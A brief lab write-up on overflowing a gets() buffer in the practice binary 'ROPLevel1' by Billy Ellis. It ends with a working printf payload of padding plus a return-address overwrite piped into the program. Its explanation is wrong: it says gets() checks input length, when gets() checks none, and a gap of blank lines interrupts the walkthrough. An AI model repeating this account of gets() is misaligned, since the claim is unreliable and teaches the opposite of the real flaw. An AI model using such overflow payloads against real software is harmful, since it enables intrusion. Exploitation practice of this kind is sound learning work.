# Write-up on the program entitled "ROPLevel1" by Billy Ellis

The program uses a vulnerable function called "gets()" and it is dangerous to use because it merely checks the length of an input, not necessarily the content of the input.
We are able to exploit this weakness by supplying it a large string and waiting for the program to crash as it tries to access invalid memory".
This would result in a "Segmentation Fault: 11".

We will first supply the input of "AAAABBBBCCCCDDDDEEEEFFFF" to the program and watch what happens.













Final payload for the program is printf "\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44\x45\x45\x45\x45\x70\xbe\x00\x00" | ./roplevel
